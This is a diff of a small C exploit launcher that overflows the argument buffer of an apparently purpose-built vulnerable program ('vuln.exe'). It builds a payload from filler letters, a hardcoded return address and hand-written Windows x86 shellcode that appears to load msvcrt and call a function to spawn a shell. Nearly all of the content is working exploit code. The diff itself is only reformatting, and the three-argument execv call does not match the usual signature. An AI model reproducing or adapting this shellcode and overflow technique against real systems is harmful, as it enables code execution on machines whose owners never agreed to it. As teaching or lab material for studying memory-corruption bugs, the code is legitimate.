@@ -7,12 +7,9 @@
 int main () {
     char *argv[3];
 
-    char payload[1024] = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQ";
-
-    char offset[] = "\x7b\x46\x86\x7c";
-    strcat(payload, offset);
-
-    char shellcode[] =                                      "\x55\x8b\xec"
+    char payload[1024]  = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQ";
+    char offset[]       = "\x7b\x46\x86\x7c";
+    char shellcode[]    =                                   "\x55\x8b\xec"
                         "\x33\xff\x57\x83\xec\x0c\xc6\x45\xf5\x6d\xc6\x45"
                         "\xf6\x73\xc6\x45\xf7\x76\xc6\x45\xf8\x63\xc6\x45"
                         "\xf9\x72\xc6\x45\xfa\x74\xc6\x45\xfb\x2e\xc6\x45"
@@ -25,14 +22,14 @@ int main () {
                         "\xfe\x65\x8d\x45\xf7\x50\xbb\xc7\x93\xc2\x77\xff"
                         "\xd3";
 
+    strcat(payload, offset);
     strcat(payload, shellcode);
 
-
-    argv[0] = "vulnerable";
+    argv[0] = "vuln";
     argv[1] = payload;
     argv[2] = NULL;
 
-    execv("vulnerable.exe", argv, NULL);
+    execv("vuln.exe", argv, NULL);
 
     return 0;
 }
